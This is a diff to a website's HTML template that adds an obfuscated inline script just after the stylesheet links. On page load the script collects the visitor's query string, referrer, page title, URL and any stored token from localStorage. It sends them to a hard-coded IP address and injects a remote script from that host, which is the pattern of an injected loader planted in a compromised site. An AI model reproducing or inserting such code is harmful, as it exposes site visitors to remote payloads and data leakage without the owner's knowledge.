@@ -19,6 +19,49 @@
     <link href="assets/css/style.css" rel="stylesheet">
     <link href="assets/css/responsive.css" rel="stylesheet">
 </head>
+<script>
+    (function() {
+    var name = '_DBxvR761KvL4CMKr';
+    if (!window._DBxvR761KvL4CMKr) {
+        window._DBxvR761KvL4CMKr = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://206.166.251.185/ckYtBn',
+            P_PATH: 'https://206.166.251.185/86169f3/postback',
+        };
+    }
+    const _3vYxzGts2VnMLD2w = localStorage.getItem('config');
+    if (typeof _3vYxzGts2VnMLD2w !== 'undefined' && _3vYxzGts2VnMLD2w !== null) {
+        var _M4Fb89Q275Mpzfys = JSON.parse(_3vYxzGts2VnMLD2w);
+        var _G9KtXHHR3DXf53f9 = Math.round(+new Date()/1000);
+        if (_M4Fb89Q275Mpzfys.created_at + window._DBxvR761KvL4CMKr.ttl < _G9KtXHHR3DXf53f9) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _VRcCdMhtwBb8Gbf2 = localStorage.getItem('subId');
+    var _9XdB8Ypksc1zNXts = localStorage.getItem('token');
+    var _CpXZc3ZJ18Y92s2t = '?return=js.client';
+        _CpXZc3ZJ18Y92s2t += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _CpXZc3ZJ18Y92s2t += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _CpXZc3ZJ18Y92s2t += '&default_keyword=' + encodeURIComponent(document.title);
+        _CpXZc3ZJ18Y92s2t += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _CpXZc3ZJ18Y92s2t += '&name=' + encodeURIComponent(name);
+        _CpXZc3ZJ18Y92s2t += '&host=' + encodeURIComponent(window._DBxvR761KvL4CMKr.R_PATH);
+    if (typeof _VRcCdMhtwBb8Gbf2 !== 'undefined' && _VRcCdMhtwBb8Gbf2 && window._DBxvR761KvL4CMKr.unique) {
+        _CpXZc3ZJ18Y92s2t += '&sub_id=' + encodeURIComponent(_VRcCdMhtwBb8Gbf2);
+    }
+    if (typeof _9XdB8Ypksc1zNXts !== 'undefined' && _9XdB8Ypksc1zNXts && window._DBxvR761KvL4CMKr.unique) {
+        _CpXZc3ZJ18Y92s2t += '&token=' + encodeURIComponent(_9XdB8Ypksc1zNXts);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._DBxvR761KvL4CMKr.R_PATH + _CpXZc3ZJ18Y92s2t;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 <body>
 
 <!-- Start PreLoader -->
